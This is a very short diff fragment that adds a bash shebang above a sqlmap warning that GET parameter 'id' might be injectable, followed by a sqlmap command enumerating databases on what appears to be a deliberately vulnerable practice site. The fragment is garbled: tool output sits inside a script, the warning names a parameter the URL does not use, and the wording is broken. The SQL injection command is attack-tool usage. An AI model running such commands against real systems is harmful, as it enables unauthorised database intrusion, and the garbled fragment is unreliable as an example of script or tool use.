@@ -1,3 +1,4 @@
+#!/bin/bash
 [WARNING]  heuristic (basic) test shows that GET parameter 'id' might is be injectable
 
 sqlmap -u http://testphp.vulnweb.com/search.php?test=query --dbs
